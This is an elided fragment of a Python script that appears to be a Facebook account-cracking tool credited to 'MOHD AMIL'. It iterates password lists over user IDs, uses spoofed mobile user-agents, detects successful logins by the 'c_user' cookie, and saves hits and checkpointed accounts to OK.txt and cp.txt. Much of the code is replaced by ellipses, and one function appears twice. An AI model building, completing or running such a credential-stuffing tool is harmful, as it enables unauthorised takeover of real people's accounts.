...
\033[1;32m[-]=================================================
\033[1;32m[~] \033[1;33mCREATED BY   :  \033[1;33mMOHD AMIL
\033[1;32m[~] \033[1;34mON FACEBOK   :  \033[1;34mMOHD AMIL
...
def random_number():
	...
	print('[?] IDS SAVED IN AMIL OK.txt,cp.txt')
...
def rcrack(uid,pwx,tl):
	...
	try:
		...
		for ps in pwx:
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-T975) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5799.221 Mobile Safari/537.36;]',}
			...
			if 'c_user' in log_cookies:
				...
				print('\r\033[1;32m[AMIL-OK] '+uid+' | '+ps)
				...
				print('\r\033[1;31m[AMIL-CP] '+uid+' | '+ps)
		...
		sys.stdout.write(f"\r\x1b[1;32m[ AMIL ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}] ")
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 11.0; BZT-AL00 Build/HUAWEIBZT-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.22 Safari/537.36;]',}
		...
		sys.stdout.write('\r\33[1;37m[AMIL-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
